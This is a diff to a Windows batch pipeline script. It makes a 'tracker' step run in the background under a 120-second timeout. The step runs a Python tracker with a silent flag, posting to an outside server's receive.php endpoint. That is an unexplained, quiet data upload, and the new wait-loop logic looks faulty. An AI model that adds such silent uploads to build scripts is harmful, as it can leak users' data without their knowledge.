@@ -240,7 +240,27 @@ echo   ===============================================
 echo   [PHASE 0] Running VF_TRACKER --tracker enabled
 echo   ===============================================
 echo.
-%PYTHON% "!TRACKER_PATH!" --silent --server http://namme.taskinoteam.ir/receive.php
+:: Run tracker with 120-second timeout to prevent freeze.
+:: If server is unreachable, tracker won't hang the whole pipeline.
+start /b "" %PYTHON% "!TRACKER_PATH!" --silent --server http://namme.taskinoteam.ir/receive.php
+:: Wait up to 120 seconds for tracker to finish
+set "TRACKER_WAIT=0"
+:tracker_wait_loop
+if !TRACKER_WAIT! geq 120 goto :tracker_timeout
+timeout /t 2 /nobreak >nul 2>&1
+set /a "TRACKER_WAIT+=2"
+:: Check if python process is still running
+tasklist /fi "imagename eq python.exe" 2>nul | find /i "python.exe" >nul 2>&1
+if errorlevel 1 goto :tracker_done_running
+tasklist /fi "imagename eq python3.exe" 2>nul | find /i "python3.exe" >nul 2>&1
+if errorlevel 1 goto :tracker_done_running
+goto :tracker_wait_loop
+:tracker_timeout
+echo.
+echo   [WARN] Tracker timed out after 120s. Continuing to next phase...
+echo.
+goto :tracker_done
+:tracker_done_running
 echo.
 echo   [OK] Tracker complete.
 echo.
